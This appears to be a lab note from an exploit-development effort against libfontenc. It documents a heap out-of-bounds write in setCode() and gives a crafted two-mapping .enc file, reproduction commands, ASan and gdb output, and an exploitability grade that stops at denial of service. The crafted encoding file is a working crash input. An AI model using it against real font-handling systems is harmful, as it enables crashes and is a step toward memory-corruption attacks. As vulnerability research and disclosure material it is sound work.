libfontenc2shell W181 — two-mapping identity-ramp OOB write (2026-11-23)

New bounded observation. Earlier work used one mapping per .enc: on the first
setCode() call *first > *last, so :485-486 set both to index and the identity
ramp at :488-493 is skipped; only the chosen 2-byte store at :495 is OOB.
A SECOND mapping with a much larger index makes :491-492 write a contiguous
ramp of 16-bit values from *last+1 through the new index, starting at the
first OOB entry immediately after the 131072-byte buffer.

Inputs (public-API driver, real pinned library via FontEncFind):
  ramp.enc:   STARTENCODING ramp / SIZE 256 1024 / STARTMAPPING unicode /
              0x00ff 0x0001 / 0xffff 0x1234 / ENDMAPPING / ENDENCODING
              first index = 255 (in bounds); second index = 255*1024+255
              = 261375, so :492 writes 256..261375, of which 195840 entries
              are past the 65536-entry allocation.
  safe2.enc:  same two mappings with SIZE 256 256; second index 65535 is
              in bounds, so no OOB write.

Reproduce from realpath/: write the two .enc files above plus encodings.dir
naming both, then for v in vuln fixed 1.1.10, mode in plain asan, charset in
ramp safe2:
  MALLOC_MMAP_THRESHOLD_=262144 ASAN_OPTIONS=detect_leaks=0:abort_on_error=0 \
  FONT_ENCODINGS_DIRECTORY="$PWD/tmp/fonts" \
  timeout 20 ./bin-$v-$mode $charset "$PWD/tmp/fonts/dummy.pcf"

Observed (per-tag .out files in this directory):
  vuln-plain-ramp   rc=139 (SIGSEGV)
  vuln-asan-ramp    rc=1, "WRITE of size 2", setCode ../src/encparse.c:492,
                    0 bytes after a 131072-byte region allocated at :477
                    via reallocarray; frames parseEncodingFile:672 ->
                    FontEncReallyReallyLoad:941 -> FontEncFind:738.
  vuln-*-safe2      rc=0, no ASan report.
  fixed-*-{ramp,safe2}  rc=0, no ASan report.
  1.1.10-*-{ramp,safe2} rc=0, no ASan report.

Plain brk gdb probe (vuln-plain-ramp.gdb.out, MALLOC_MMAP_THRESHOLD_=262144):
  SIGSEGV at encparse.c:492 from=65535 to=4660 row_size=1024;
  rax=0x5555555a4000 (exact end of the [heap] mapping 0x555555559000-
  0x5555555a4000), rdx=0x20668 (132712). The ramp therefore wrote 16-bit
  incrementing values from buffer end through 67176 OOB entries before
  faulting at the heap boundary. No object was observed in that region.

Grade limit: this is a second OOB write SITE with a wider deterministic ramp,
not object control. The values are the index itself (i & 0xFFFF), not chosen
data; the region ahead of the buffer is wilderness/top-chunk, and no live
object, saved pointer, control-flow target, marker or command was observed.
Availability-only / rung 3 under ASan remains the ceiling; rung 4 object
control and rung 5 stay UNKNOWN. Do not reclassify this as a pass.
